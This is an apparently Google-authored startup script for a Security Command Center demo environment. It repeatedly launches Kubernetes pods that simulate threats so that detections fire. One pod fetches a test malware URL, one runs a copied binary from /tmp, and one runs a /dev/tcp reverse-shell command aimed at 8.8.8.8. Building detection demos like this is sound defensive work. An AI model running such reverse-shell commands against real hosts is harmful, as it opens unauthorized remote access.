##  /**
##    * Copyright 2022 Google LLC
##    *
##    * Licensed under the Apache License, Version 2.0 (the "License");
##    * you may not use this file except in compliance with the License.
##    * You may obtain a copy of the License at
##    *
##    *      http://www.apache.org/licenses/LICENSE-2.0
##    *
##    * Unless required by applicable law or agreed to in writing, software
##    * distributed under the License is distributed on an "AS IS" BASIS,
##    * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
##    * See the License for the specific language governing permissions and
##    * limitations under the License.
##    */


    ## This provides PoC demo environment for SCC
    ## NOTE this is not built for production workload ##

#files/startup.sh
#!/bin/bash
apt-get update -y
apt-get install git -y
apt-get install kubectl -y
apt-get install google-cloud-sdk-gke-gcloud-auth-plugin -y
 CLUSTER_NAME=$(curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/CLUSTER_NAME" -H "Metadata-Flavor: Google")
 PROJ_ID=$(curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/PROJ_ID" -H "Metadata-Flavor: Google")
while true
do
    export USE_GKE_GCLOUD_AUTH_PLUGIN=True
    gcloud container clusters get-credentials $CLUSTER_NAME --zone=us-east1 --project=$PROJ_ID
    tag="malicious-url-observed-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    url="https://testsafebrowsing.appspot.com/s/malware.html"
    kubectl run --restart=Never --rm=true -i --image marketplace.gcr.io/google/ubuntu1804:latest "$tag" -- bash -c "curl $url | cat"
    tag1="dropped-binary-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    kubectl run --restart=Never --rm=true -i --image marketplace.gcr.io/google/ubuntu1804:latest "$tag1" -- bash -c "cp /bin/ls /tmp/$tag1; /tmp/$tag1"
    tag2="reverse-shell-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    kubectl run --restart=Never --rm=true -i --image marketplace.gcr.io/google/ubuntu1804:latest "$tag2" -- bash -c "/bin/echo >& /dev/tcp/8.8.8.8/53 0>&1"
    sleep 60
    sudo google_metadata_script_runner startup
done